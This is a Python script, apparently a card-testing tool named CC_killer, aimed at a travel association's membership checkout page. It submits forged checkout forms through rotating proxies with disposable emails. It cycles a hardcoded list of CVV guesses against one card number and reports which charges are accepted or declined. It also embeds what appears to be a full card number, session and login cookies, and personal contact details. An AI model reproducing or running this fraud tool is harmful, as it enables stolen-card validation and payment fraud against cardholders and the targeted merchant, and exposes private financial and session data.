import requests
import uuid

from proxy import Proxy

url = 'https://www.ccra.com/membership-account/membership-checkout/'

form_data = {
    'pmpro_level': '4',
    'checkjavascript': '1',
    'pmpro_other_discount_code': '',
    'Agent_First_Name': 'charles',
    'Agent_Last_Name': 'carlson',
    'Agency_Name': 'ambers',
    'Mailing_Address': '3742 Oakwood Avenue',
    'Mailing_State_Province': 'MO',
    'Mailing_City': 'Kansas City',
    'Mailing_Zip_Code': '64106',
    'Mailing_Country': 'US',
    'Business_Phone': '+13132005402',
    'Mobile_Phone': '',
    'Website_Url': '',
    'Years_Selling_Travel': '',
    'Years_in_Business': '',
    'Type_of_Business': '0',
    'Seller_of_Travel': '',
    'Host_Agency': '',
    'Gross_Annual_Sales': '',
    'Travel_Niche': '',
    'Director_Contact': '',
    'Industry_code_other': 'select one',
    'Chapter': 'Philadelphia',
    'Accreditation_Held': '---',
    'References': '',
    'Other_Travel_Assoc': '---',
    'How_did_you_hear': '',
    'tos': '1',
    'tos_checkbox': '1',
    'seats': '25',
    'bfirstname': 'charles',
    'blastname': 'carlson',
    'baddress1': '3742 Oakwood Avenue',
    'baddress2': '',
    'bcity': 'kansas city',
    'bstate': '',
    'bzipcode': '',
    'bcountry': 'US',
    'bemail': 'serire9113@owlny.com',
    'bconfirmemail': 'serire9113@owlny.com',
    'bphone': '+13132005402',
    'CardType': 'Mastercard',
    'AccountNumber': '5144402311766004',
    'ExpirationMonth': '06',
    'ExpirationYear': '2026',
    'CVV': '',
    'pmpro_discount_code': '',
    'pmpro_checkout_nonce':  ''' 


        

    c78dd9940b''',
    '_wp_http_referer': '/membership-account/membership-checkout/',
    'confirm': '1',
    'token': '',
    'gateway': 'authorizenet',
    'submit-checkout': '1',
    'javascriptok': '1',
}

request_headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate, br, zstd',
    'Accept-Language': 'en-US,en;q=0.8',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Content-Length': '1149',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Cookie': 'PHPSESSID=npgo863p88ec5e8v3af2joj93i; pmpro_visit=1; ac_enable_tracking=1; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-02-08%2018%3A12%3A52%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.ccra.com%2Fmembership-account%2Fmembership-checkout%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2025-02-08%2018%3A12%3A52%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.ccra.com%2Fmembership-account%2Fmembership-checkout%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; cookielawinfo-checkbox-necessary=yes; cookielawinfo-checkbox-non-necessary=yes; wordpress_logged_in_057f763cc75641b477cf6dc44de1a19f={}%7C1740250368%7C2pJnfEPYRApzfc5wKUwzDtlybFMS6mAPVkMSPgJp7ji%7Cd99981a5567ffe71cc5df4f3a667bdd7bebae02c2087bd8c1097f1b49aaaaab3; sbjs_udata=vst%3D2%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F133.0.0.0%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.ccra.com%2Fmembership-account%2Fmembership-checkout%2F; loginwp_wp_session=c7943430ebe4eea79cccfd6a242ef200%7C%7C1739042573%7C%7C1739042213; wfwaf-authcookie-8f6de83e9188dc32959c2fa6e2d6ce84=15489%7Csubscriber%7Cread%7C14d74fc6aa293d3f2f78005961e1b0ff410d3a281693fa1d35c30dd8f27008b7',
    'Host': 'www.ccra.com',
    'Origin': 'https://www.ccra.com',
    'Referer': 'https://www.ccra.com/membership-account/membership-checkout/',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Sec-GPC': '1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Not(A:Brand";v="99", "Brave";v="133", "Chromium";v="133"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': "Windows"
}

cvv_list = [
 165,
 567,
 628,
 525,
 548,
 244,
 946,
 349,
 455,
 893,
 188,
 446,
 241,
 407,
 106,
 524,
 597,
 694,
 603,
 935,
 246,
 964,
 958,
 858,
 940,
 413,
 200,
 953,
 427,
 948,
 663,
 538,
 799,
 772,
 265,
 971,
 639,
 782,
 938,
 232,
 702,
 766,
 199,
 692,
 553,
 450,
 152,
 585,
 115,
 204,
 722,
 583,
 700,
 688,
 554,
 915,
 784,
 272,
 752,
 151,
 544,
 294,
 198,
 730,
 969,
 802,
 533,
 842,
 781,
 392,
 333
 ]

class CC_killer():
    _instance = None
    
    def __new__(cls, *args, **kwargs):
        if not cls._instance:
            cls._instance = super().__new__(cls, *args, **kwargs)
        return cls._instance

    def __init__(self):
        self.proxy = Proxy()
        
       
    def check_card_type(self, card_num):
        if card_num.startswith('4'):
            return "Visa"
        elif card_num.startswith(('51', '52', '53', '54', '55')) or (2221 <= int(card_num[:4]) <= 2720):
            return "MasterCard"
        
    def run_cvv(self, card_num, month, year, cvv):
        
        form_data['CardType'] = self.check_card_type(str(card_num))
        
        form_data['CVV'] = str(cvv)
        
        form_data['AccountNumber'] = str(card_num)
        
        form_data['ExpirationMonth'] = str(month)
        
        form_data['ExpirationYear'] = str(year)
        
        unique_id = uuid.uuid4().hex[:6]
        
        email =  f'serire{unique_id}@owlny.com'
        user = f'user_{unique_id}'
        
        form_data['bemail'] = email
        form_data['bconfirmemail'] = email
        
        ip, port = self.proxy.get_random_proxy()
        
        proxy_header = {
            'http': f"http://{ip}:{port}",
            'https': f"http://{ip}:{port}",
        }
        
        request_headers['Cookie'].format(user)
        
        response = requests.post(url, data=form_data, headers=request_headers, proxies=proxy_header)
        
        if response.status_code == 200:
            
            if 'This transaction has been declined' in response.text:
                print(f'ran cvv: {cvv}, card declined')
            elif 'order has been received' in response.text:
                print(f'ran cvv: {cvv}, card accepted')
            elif 'Nonce security check failed' in response.text:
                print(f'requested captcha')
            else:
                print(f'something went wrong with cvv: {cvv}')
                with open('error.html', 'w') as f:
                    f.write(response.text)
                
        else:
            print(f'request failed for cvv: {cvv}')

    def cc_kill(self, msg):
        try:
            card_num, month, year, cvv = msg.split('|')
            
            for fake_cvv in cvv_list:
                if str(cvv) == str(fake_cvv):
                    continue
                self.run_cvv(card_num, month, year, fake_cvv)
                
        except Exception as err:
            print(err)
